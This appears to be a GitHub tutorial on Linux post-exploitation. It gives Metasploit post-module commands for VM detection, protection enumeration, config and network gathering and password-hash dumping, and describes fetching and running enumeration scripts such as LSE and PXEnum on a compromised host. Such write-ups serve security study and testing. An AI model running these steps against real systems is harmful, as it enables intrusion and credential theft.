# postexploit
# Linux post-exploitation.

Post-exploitation is a stage of the network hacking process that enables the hacker to collect additional information on the compromised system. During this stage, the hacker obtains further access to the network and the data. The post-exploitation phase makes it possible to identify additional subnetworks, routers and server names, server-related services, and installed applications.

>The main patterns used by the attackers involve:

-   obtaining the access level enabling to run the required code or commands;
-   researching the data stored on the server;
-   intercepting newly arriving data;
-   planting permanent access to the compromised system ([RAT](https://nl.wikipedia.org/wiki/Remote_access_tool), remote access tools); and
-   privilege escalation to the system level for an unprivileged user account.

The hacker may also collect additional information on the compromised system by analyzing the following:

-   system configuration (DB login and password in the source code);
-   web server configuration (e.g. [httpd.conf](https://en.wikipedia.org/wiki/Apache_HTTP_Server) and [.htaccess](https://wordpress.org/support/article/htaccess/));
-   application source code (searching for vulnerabilities by analyzing the application logic);
-   access to the environment (it may be easier to access neighboring servers and isolated subnetwork elements from the inside);
-   databases (scanning for authentication information to neighboring systems);

Typical post-exploitation examples for Windows-based systems include [Pass-in-the-Hash](https://en.wikipedia.org/wiki/Pass_the_hash) attacks implemented with [mimikatz](https://github.com/gentilkiwi/mimikatz) tool, running a binary code with [PsExec](http://www.oszone.net/14576/PsExec), and creating a VPN and/or DNS tunnel. In addition, hackers may use packages such as [FuzzBunch](https://gitlab.com/peterpt/fuzzbunch) and [PowerShell Empire](https://www.powershellempire.com/) that are made to exploit recently discovered vulnerabilities (e.g. [EternalBlue](https://en.wikipedia.org/wiki/EternalBlue)).

In this article, we will focus on post-exploitation tools designed for Linux because [back-end systems](https://www.webopedia.com/TERM/B/back_end_system.html) of large [DevOps](https://en.wikipedia.org/wiki/DevOps) companies are commonly based on this OS.

## Overview of post-exploitation using Metasploit-Framework

**MSF** post exploitation modules :
Make sure you have a root bind shell on the victim. Put the session in the background:Press Ctrl-Z (and when prompted, confirm)Note the session ID:Take a note of the session ID
![enter image description here](https://raw.githubusercontent.com/shubham381/postexploit/master/background.png)

>System details: Check whether we are in a VMRun the post module “checkvm”, to determine whether the system the attacker is interacting with is a VM
`msf > use post/linux/gather/checkvm`
`msf post(checkvm) > show options`
`msf post(checkvm) > setg SESSION ID`
`msf post(checkvm) > exploit`

![enter image description here](https://raw.githubusercontent.com/shubham381/postexploit/master/msf.png)

>System details: Check what protection or detection software is presentRun the post module “enum_protections”, to determine whether the system includes IDS, sniffers, anti-malware, and so on.

`msf5 > use post/linux/gather/enum_protection`
`msf5 post(linux/gather/enum_protections) > setg SESSION 2`
`msf5 post(linux/gather/enum_protections) > exploit`
`

![enter image description here](https://raw.githubusercontent.com/shubham381/postexploit/master/ms2.png)
>System details: Save configuration details The “enum_configs” module downloads and saves many interesting config files

`msf5  > use post/linux/gather/enum_configs`
`msf5 post(linux/gather/enum_configs) > setg SESSION 2`
`msf5 post(linux/gather/enum_configs) > exploit`

![enter image description here](https://raw.githubusercontent.com/shubham381/postexploit/master/ms3.png)

>exploit The “enum_network” module downloads and saves information about network state and settings

`msf5  > use post/linux/gather/enum_network`
`msf5 post(linux/gather/enum_network) > setg SESSION 2`
`msf5 post(linux/gather/enum_network) > exploit`

![enter image description here](https://raw.githubusercontent.com/shubham381/postexploit/master/ms4.png)
Simlarly we can exploit The “enum_system” module downloads and saves information about the system, including the software installed, disk information, and so on 

**Password hash dumping** Run the post module “hashdump”, to collect the hashes of all the user account passwords

`msf > use post/linux/gather/hashdump`
`msf post(hashdump) > exploit`

![enter image description here](https://raw.githubusercontent.com/shubham381/postexploit/master/hashdumb.png)
## Overview of post-exploitation tools

Main attack vectors implemented on the target PC after gaining access include:

-   vectors of privilege escalation;
-   obtaining OS detail & kernel version;
-   scanning for vulnerable packages that are installed or running;
-   access to files and folders with Full Control or Modify access permissions;
-   files with [SUID](https://www.linux.com/tutorials/what-suid-and-how-set-suid-linuxunix/) permissions;
-   mapped drives (NFS);
-   potentially interesting files and folders;
-   environment variable path;
-   modification of the network stack and traffic (interfaces, arp, netstat);
-   modification of running processes;
-   cron jobs;
-   user’s [sudo](https://en.wikipedia.org/wiki/Sudo) right; and
-   wildcard injection.

Here I had used LSE(Linux enumeration _tool_)

one i got the shell  i went to tmp directory as shown in figure3 because in /tmp directory we can execute the bash file.
In my system i had already downloaded the lse.sh file and hosted it using python server as shown in fig.2 and downloaded and executed the shell

![enter image description here](https://raw.githubusercontent.com/shubham381/postexploit/master/Exploit.png)
Here We can Observe the etc directory

![enter image description here](https://raw.githubusercontent.com/shubham381/postexploit/master/exploit2.png)
Users with Credentials and lots more things

![enter image description here](https://raw.githubusercontent.com/shubham381/postexploit/master/exp3.png)

Similarly we can use other tools like 

#### PXEnum (Post eXploitation Enumeration script for Linux)

This enumeration script retrieves all of the system’s available information; therefore, it is a gift for the lazy and time-savvy hackers. The embedded commands make it possible to obtain password hashes, folder contents and system information, and check the presence of application servers, individual applications, connections, and users.

Root privileges are not required to run PXEnum; the script operates in a standard terminal. Prior to the installation, download it using wget:

$  wget https://raw.githubusercontent.com/shawnduong/PXEnum/master/PXEnume.sh

  

#### MIDA Multitool (Bash Script Purposed For System Enumeration, Vulnerability Identification And Privilege Escalation)

#### MimiPenguin
